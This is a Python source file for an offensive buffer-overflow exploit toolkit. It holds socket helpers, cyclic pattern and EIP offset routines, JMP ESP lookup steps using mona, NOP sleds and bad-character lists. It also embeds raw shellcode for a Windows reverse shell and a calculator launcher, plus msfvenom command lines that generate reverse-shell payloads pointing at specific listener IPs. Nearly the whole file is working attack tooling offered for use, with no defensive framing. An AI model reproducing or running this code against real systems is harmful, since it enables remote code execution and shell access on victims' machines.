import os
import struct
os.system('color')
import time


class JihadLibrary(object):
    def ip(self):
        return input(colors.BOLD +"What is the ip address(127.1.0.1): " + colors.END) or "127.1.0.1"
    def port(self):
        return int(input(colors.BOLD +"What is the the port(9999) : " + colors.END) or "9999")

    def copyRight(self):
        print(colors.HEADER + """"
            ____   __ __       ____  ____  __ __   ____  ___          ___  _           _____  ____  __ __    ___  ___   
            |    \ |  |  |     |    ||    ||  |  | /    ||   \        /  _]| |         / ___/ /    ||  |  |  /  _]|   \  
            |  o  )|  |  |     |__  | |  | |  |  ||  o  ||    \      /  [_ | |        (   \_ |  o  ||  |  | /  [_ |    \ 
            |     ||  ~  |     __|  | |  | |  _  ||     ||  D  |    |    _]| |___      \__  ||     ||  ~  ||    _]|  D  |
            |  O  ||___, |    /  |  | |  | |  |  ||  _  ||     |    |   [_ |     |     /  \ ||  _  ||___, ||   [_ |     |
            |     ||     |    \  `  | |  | |  |  ||  |  ||     |    |     ||     |     \    ||  |  ||     ||     ||     |
            |_____||____/      \____||____||__|__||__|__||_____|    |_____||_____|      \___||__|__||____/ |_____||_____|
            look at www.neetechs.com for more script
            """ + colors.END)
    def connectToSocket(self,socket, ip, port, s=None):
        if s is None:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            s = s
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #s.send(bytes(buffer + b"\r\n", "latin-1"))
        s.connect((ip, port))
        #s.bind((ip, port))
        print(colors.OkGreen + ip + ":" + str(port) + " has been connected" + colors.END)
        return s
    
    def receiveFromSocket(self,s):
        import time
        print(colors.WARNING + "Received: " + colors.END)
        s.setblocking(1)	
        data = s.recv(1024)
        data = data.decode()
        print(f"{colors.OkCyan}       {data} {colors.END}")
        time.sleep(0.5)
        

    def sendToSocket(self,s,message):
        #s.send(message)
        isString = isinstance(message, str)
        if isString:
            print("converting payload to binary")
            s.sendall(message.encode('ascii') )
            print(colors.OkGreen + "This message:" + message + "\n has been send successfully" + colors.END)

        else:
            print("binary payload has been send")
            s.send(message)

        #s.sendall(message)
    # Create Pattern
    def createPattern(self,length):
        from string import ascii_uppercase, ascii_lowercase, digits

        pattern = ""
        for upper in ascii_uppercase:
            for lower in ascii_lowercase:
                for digit in digits:
                    if len(pattern) < length:
                        pattern += upper + lower + digit

                    else:
                        out = pattern[:length]
                        return out

        # If we end up here we've exhausted all characters so truncate the pattern
        #return pattern[:length]
        return pattern
    
    def randomCharacters(self,y):
        import random
        import string
        return ''.join(random.choice(string.ascii_letters) for x in range(y))
    # Offset Pattern
    def offsetPattern(self, payload, totalCharacter):
        from string import ascii_uppercase, ascii_lowercase, digits

        #IP = input("enter the EIP(0x1234567A): ") or "0x31704330"
        eIP = input("enter the EIP(1234567A): ") or "31704330"
        print(eIP)
        needle = eIP

        try:
            #if needle.startswith("0x"):
            if needle.startswith(""):
                # Strip off '0x', convert to ASCII and reverse
                needle = needle[2:]
                needle = bytearray.fromhex(needle).decode("ascii")
                needle = needle[::-1]
                #return needle
        except (ValueError, TypeError) as e:
            print(e)
            raise

        haystack = ""
        for upper in ascii_uppercase:
            for lower in ascii_lowercase:
                for digit in digits:
                    haystack += upper + lower + digit
                    found_at = haystack.find(needle)
                    if found_at > -1:
                        return found_at
    
    def generatePayload(self):
        # get input
        payload = "This should be the random characters"
        character = input("what is the character(random): ") or self.randomCharacters(1)
        totalCharacter = int(input("What is the number of character(9999) : ") or "9999")
        payload = (character * totalCharacter)
        
        return payload, totalCharacter
    def generateRandomPayload(self):
        # get input
        payload = "This should be the random characters"
        character = input("what is the character(random): ") or self.randomCharacters(1)
        totalCharacter = int(input("What is the number of character(9999) : ") or "9999")
        payload = JihadLibrary().createPattern(totalCharacter) 
        payload += "\r\n"
               
        return payload, totalCharacter

    def generateMessage(self,payload):
        payload = input(colors.WARNING + "What is your message(default:anonymessage): " + colors.END) or "anonymessage"
        return payload
    
    def addReverseShell(self, payload, reverseShell = None):
        addShell = input(colors.WARNING + "Do you want to add reverse shell(y or n)(default:n): " + colors.END) or "n"
        if addShell == "y":
            if reverseShell:
                pass
            else:
                payload = payload.encode('ascii')
                reverseShell = ""
                JMP_ESP = self.findJMP_ESP()
                
                space = b"\x90"*12
                enter = b'\r\n'
                payload += JMP_ESP # \xC3\x14\x04\x08 b"\xdf\x14\x50\x62" 
                payload += space
                selectedShell = input(colors.WARNING + """
    Select Shell type?\n
      [1] Generate Reverse Shell(beta).
      [2] Generate Calculator Shell.
                    """ + colors.END) or "1"
                if selectedShell == "1":
                    reverseShell = self.generateReverseShell()   
                elif selectedShell == "2":
                    reverseShell = self.generateCalculatorShell()   

                payload += reverseShell
                payload += enter
                
                print(bytes(payload))
        # future update in sha allah
        return payload
    
    def listeningToPort(self,s):
        # client example
        
        while True:
            time.sleep(5)
            data = s.recv(512)
            if data.lower() == 'q':
                s.close()
                break

            print("RECEIVED: %s" % data)
            data = input("SEND( TYPE q or Q to Quit):")
            s.send(data)
            if data.lower() == 'q':
                s.close()
                break
    def findJMP_ESP(self):
        import struct
        # !mona modules
        # 
        JMP_ESP = input(colors.WARNING + """
        Note: you can find the JMP_ESP through these step:
        1. find the file name for example essfunc.dll
        !mona modules
        2. search for the esp
        !mona find -s "\-xff\-xe4" -m essfunc.dll
        3. write the character in backward and add - for example 
        this 625014DF will become DF145062 with out -
        What is the esp:
        JMP_ESP
        
        """ + colors.END) or "BF160408"



        # use struct library to convert jpm_esp to binary
        JMP_ESP = bytearray.fromhex(JMP_ESP)
        print()
        return  JMP_ESP #+ b"\x90" * 32
    def generateReverseShell(self):
        # the shell
        buf =  b""
        buf += b"\xd9\xd0\xd9\x74\x24\xf4\x58\x2b\xc9\xba\xab\xd2"
        buf += b"\x42\x83\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\xfb"
        buf += b"\xc1\xa0\x76\x07\x0d\xa6\x79\xf7\xce\xc7\xf0\x12"
        buf += b"\xff\xc7\x67\x57\x50\xf8\xec\x35\x5d\x73\xa0\xad"
        buf += b"\xd6\xf1\x6d\xc2\x5f\xbf\x4b\xed\x60\xec\xa8\x6c"
        buf += b"\xe3\xef\xfc\x4e\xda\x3f\xf1\x8f\x1b\x5d\xf8\xdd"
        buf += b"\xf4\x29\xaf\xf1\x71\x67\x6c\x7a\xc9\x69\xf4\x9f"
        buf += b"\x9a\x88\xd5\x0e\x90\xd2\xf5\xb1\x75\x6f\xbc\xa9"
        buf += b"\x9a\x4a\x76\x42\x68\x20\x89\x82\xa0\xc9\x26\xeb"
        buf += b"\x0c\x38\x36\x2c\xaa\xa3\x4d\x44\xc8\x5e\x56\x93"
        buf += b"\xb2\x84\xd3\x07\x14\x4e\x43\xe3\xa4\x83\x12\x60"
        buf += b"\xaa\x68\x50\x2e\xaf\x6f\xb5\x45\xcb\xe4\x38\x89"
        buf += b"\x5d\xbe\x1e\x0d\x05\x64\x3e\x14\xe3\xcb\x3f\x46"
        buf += b"\x4c\xb3\xe5\x0d\x61\xa0\x97\x4c\xee\x05\x9a\x6e"
        buf += b"\xee\x01\xad\x1d\xdc\x8e\x05\x89\x6c\x46\x80\x4e"
        buf += b"\x92\x7d\x74\xc0\x6d\x7e\x85\xc9\xa9\x2a\xd5\x61"
        buf += b"\x1b\x53\xbe\x71\xa4\x86\x11\x21\x0a\x79\xd2\x91"
        buf += b"\xea\x29\xba\xfb\xe4\x16\xda\x04\x2f\x3f\x71\xff"
        buf += b"\xb8\x4a\x8f\xe3\xc7\x23\x8d\x1b\x26\xd5\x18\xfd"
        buf += b"\x3c\x05\x4d\x56\xa9\xbc\xd4\x2c\x48\x40\xc3\x49"
        buf += b"\x4a\xca\xe0\xae\x05\x3b\x8c\xbc\xf2\xcb\xdb\x9e"
        buf += b"\x55\xd3\xf1\xb6\x3a\x46\x9e\x46\x34\x7b\x09\x11"
        buf += b"\x11\x4d\x40\xf7\x8f\xf4\xfa\xe5\x4d\x60\xc4\xad"
        buf += b"\x89\x51\xcb\x2c\x5f\xed\xef\x3e\x99\xee\xab\x6a"
        buf += b"\x75\xb9\x65\xc4\x33\x13\xc4\xbe\xed\xc8\x8e\x56"
        buf += b"\x6b\x23\x11\x20\x74\x6e\xe7\xcc\xc5\xc7\xbe\xf3"
        buf += b"\xea\x8f\x36\x8c\x16\x30\xb8\x47\x93\x40\xf3\xc5"
        buf += b"\xb2\xc8\x5a\x9c\x86\x94\x5c\x4b\xc4\xa0\xde\x79"
        buf += b"\xb5\x56\xfe\x08\xb0\x13\xb8\xe1\xc8\x0c\x2d\x05"
        buf += b"\x7e\x2c\x64"
        payload =  b""
        payload += b"\xdd\xc1\xd9\x74\x24\xf4\x5e\xbd\xf6\x5b\x39"
        payload += b"\xf4\x29\xc9\xb1\x52\x31\x6e\x17\x83\xc6\x04"
        payload += b"\x03\x98\x48\xdb\x01\x98\x87\x99\xea\x60\x58"
        payload += b"\xfe\x63\x85\x69\x3e\x17\xce\xda\x8e\x53\x82"
        payload += b"\xd6\x65\x31\x36\x6c\x0b\x9e\x39\xc5\xa6\xf8"
        payload += b"\x74\xd6\x9b\x39\x17\x54\xe6\x6d\xf7\x65\x29"
        payload += b"\x60\xf6\xa2\x54\x89\xaa\x7b\x12\x3c\x5a\x0f"
        payload += b"\x6e\xfd\xd1\x43\x7e\x85\x06\x13\x81\xa4\x99"
        payload += b"\x2f\xd8\x66\x18\xe3\x50\x2f\x02\xe0\x5d\xf9"
        payload += b"\xb9\xd2\x2a\xf8\x6b\x2b\xd2\x57\x52\x83\x21"
        payload += b"\xa9\x93\x24\xda\xdc\xed\x56\x67\xe7\x2a\x24"
        payload += b"\xb3\x62\xa8\x8e\x30\xd4\x14\x2e\x94\x83\xdf"
        payload += b"\x3c\x51\xc7\x87\x20\x64\x04\xbc\x5d\xed\xab"
        payload += b"\x12\xd4\xb5\x8f\xb6\xbc\x6e\xb1\xef\x18\xc0"
        payload += b"\xce\xef\xc2\xbd\x6a\x64\xee\xaa\x06\x27\x67"
        payload += b"\x1e\x2b\xd7\x77\x08\x3c\xa4\x45\x97\x96\x22"
        payload += b"\xe6\x50\x31\xb5\x09\x4b\x85\x29\xf4\x74\xf6"
        payload += b"\x60\x33\x20\xa6\x1a\x92\x49\x2d\xda\x1b\x9c"
        payload += b"\xe2\x8a\xb3\x4f\x43\x7a\x74\x20\x2b\x90\x7b"
        payload += b"\x1f\x4b\x9b\x51\x08\xe6\x66\x32\x3d\xfe\x74"
        payload += b"\x3d\x29\x02\x84\xdf\xcb\x8b\x62\xb5\x1b\xda"
        payload += b"\x3d\x22\x85\x47\xb5\xd3\x4a\x52\xb0\xd4\xc1"
        payload += b"\x51\x45\x9a\x21\x1f\x55\x4b\xc2\x6a\x07\xda"
        payload += b"\xdd\x40\x2f\x80\x4c\x0f\xaf\xcf\x6c\x98\xf8"
        payload += b"\x98\x43\xd1\x6c\x35\xfd\x4b\x92\xc4\x9b\xb4"
        payload += b"\x16\x13\x58\x3a\x97\xd6\xe4\x18\x87\x2e\xe4"
        payload += b"\x24\xf3\xfe\xb3\xf2\xad\xb8\x6d\xb5\x07\x13"
        payload += b"\xc1\x1f\xcf\xe2\x29\xa0\x89\xea\x67\x56\x75"
        payload += b"\x5a\xde\x2f\x8a\x53\xb6\xa7\xf3\x89\x26\x47"
        payload += b"\x2e\x0a\x56\x02\x72\x3b\xff\xcb\xe7\x79\x62"
        payload += b"\xec\xd2\xbe\x9b\x6f\xd6\x3e\x58\x6f\x93\x3b"
        payload += b"\x24\x37\x48\x36\x35\xd2\x6e\xe5\x36\xf7"
        shell = (
                b"\xbd\xa9\x2b\x5a\xe3\xdb\xc4\xd9\x74\x24\xf4\x5e\x33\xc9"+
                b"\xb1\x52\x83\xee\xfc\x31\x6e\x0e\x03\xc7\x25\xb8\x16\xeb"+
                b"\xd2\xbe\xd9\x13\x23\xdf\x50\xf6\x12\xdf\x07\x73\x04\xef"+
                b"\x4c\xd1\xa9\x84\x01\xc1\x3a\xe8\x8d\xe6\x8b\x47\xe8\xc9"+
                b"\x0c\xfb\xc8\x48\x8f\x06\x1d\xaa\xae\xc8\x50\xab\xf7\x35"+
                b"\x98\xf9\xa0\x32\x0f\xed\xc5\x0f\x8c\x86\x96\x9e\x94\x7b"+
                b"\x6e\xa0\xb5\x2a\xe4\xfb\x15\xcd\x29\x70\x1c\xd5\x2e\xbd"+
                b"\xd6\x6e\x84\x49\xe9\xa6\xd4\xb2\x46\x87\xd8\x40\x96\xc0"+
                b"\xdf\xba\xed\x38\x1c\x46\xf6\xff\x5e\x9c\x73\x1b\xf8\x57"+
                b"\x23\xc7\xf8\xb4\xb2\x8c\xf7\x71\xb0\xca\x1b\x87\x15\x61"+
                b"\x27\x0c\x98\xa5\xa1\x56\xbf\x61\xe9\x0d\xde\x30\x57\xe3"+
                b"\xdf\x22\x38\x5c\x7a\x29\xd5\x89\xf7\x70\xb2\x7e\x3a\x8a"+
                b"\x42\xe9\x4d\xf9\x70\xb6\xe5\x95\x38\x3f\x20\x62\x3e\x6a"+
                b"\x94\xfc\xc1\x95\xe5\xd5\x05\xc1\xb5\x4d\xaf\x6a\x5e\x8d"+
                b"\x50\xbf\xf1\xdd\xfe\x10\xb2\x8d\xbe\xc0\x5a\xc7\x30\x3e"+
                b"\x7a\xe8\x9a\x57\x11\x13\x4d\xf4\xf3\xe7\x23\x6c\xfe\x17"+
                b"\x22\x0c\x77\xf1\x30\xde\xd1\xaa\xac\x47\x78\x20\x4c\x87"+
                b"\x56\x4d\x4e\x03\x55\xb2\x01\xe4\x10\xa0\xf6\x04\x6f\x9a"+
                b"\x51\x1a\x45\xb2\x3e\x89\x02\x42\x48\xb2\x9c\x15\x1d\x04"+
                b"\xd5\xf3\xb3\x3f\x4f\xe1\x49\xd9\xa8\xa1\x95\x1a\x36\x28"+
                b"\x5b\x26\x1c\x3a\xa5\xa7\x18\x6e\x79\xfe\xf6\xd8\x3f\xa8"+
                b"\xb8\xb2\xe9\x07\x13\x52\x6f\x64\xa4\x24\x70\xa1\x52\xc8"+
                b"\xc1\x1c\x23\xf7\xee\xc8\xa3\x80\x12\x69\x4b\x5b\x97\x99"+
                b"\x06\xc1\xbe\x31\xcf\x90\x82\x5f\xf0\x4f\xc0\x59\x73\x65"+
                b"\xb9\x9d\x6b\x0c\xbc\xda\x2b\xfd\xcc\x73\xde\x01\x62\x73"+
                b"\xcb")
        return payload
    
    def generateCalculatorShell(self):
        shellcode =  b""
        shellcode += b"\x29\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0"
        shellcode += b"\x5e\x81\x76\x0e\xa4\xa7\x09\x4e\x83\xee\xfc"
        shellcode += b"\xe2\xf4\x58\x4f\x8b\x4e\xa4\xa7\x69\xc7\x41"
        shellcode += b"\x96\xc9\x2a\x2f\xf7\x39\xc5\xf6\xab\x82\x1c"
        shellcode += b"\xb0\x2c\x7b\x66\xab\x10\x43\x68\x95\x58\xa5"
        shellcode += b"\x72\xc5\xdb\x0b\x62\x84\x66\xc6\x43\xa5\x60"
        shellcode += b"\xeb\xbc\xf6\xf0\x82\x1c\xb4\x2c\x43\x72\x2f"
        shellcode += b"\xeb\x18\x36\x47\xef\x08\x9f\xf5\x2c\x50\x6e"
        shellcode += b"\xa5\x74\x82\x07\xbc\x44\x33\x07\x2f\x93\x82"
        shellcode += b"\x4f\x72\x96\xf6\xe2\x65\x68\x04\x4f\x63\x9f"
        shellcode += b"\xe9\x3b\x52\xa4\x74\xb6\x9f\xda\x2d\x3b\x40"
        shellcode += b"\xff\x82\x16\x80\xa6\xda\x28\x2f\xab\x42\xc5"
        shellcode += b"\xfc\xbb\x08\x9d\x2f\xa3\x82\x4f\x74\x2e\x4d"
        shellcode += b"\x6a\x80\xfc\x52\x2f\xfd\xfd\x58\xb1\x44\xf8"
        shellcode += b"\x56\x14\x2f\xb5\xe2\xc3\xf9\xcd\x08\xc3\x21"
        shellcode += b"\x15\x09\x4e\xa4\xf7\x61\x7f\x2f\xc8\x8e\xb1"
        shellcode += b"\x71\x1c\xe9\x53\x8e\xad\x61\xe8\x31\x1a\x94"
        shellcode += b"\xb1\x71\x9b\x0f\x32\xae\x27\xf2\xae\xd1\xa2"
        shellcode += b"\xb2\x09\xb7\xd5\x66\x24\xa4\xf4\xf6\x9b\xc7"
        shellcode += b"\xc6\x65\x2d\x8a\xc2\x71\x2b\xa4\xa7\x09\x4e"
        return shellcode
    
    def msfVenomCode():
        print("""
        open calculator:
            msfvenom -p windows/exec -b "\ x00" -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread
        reverse shell:
            msfvenom -p windows/shell_reverse_tcp LHOST=172.21.252.174 LPORT=7777 -b "\ x00" -f c
            msfvenom -p windows/shell_reverse_tcp LHOST=10.9.200.20 LPORT=7777 -e x86/shikata_ga_nai -f exe -b "\ x00\ xa" -f python -v payload

        """)
    def badChars():
        character = (
            b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
            b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
            )
        return character
class colors:
    HEADER = '\033[95m'
    OkBlue = '\033[94m'
    OkCyan = '\033[96m'
    OkGreen = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
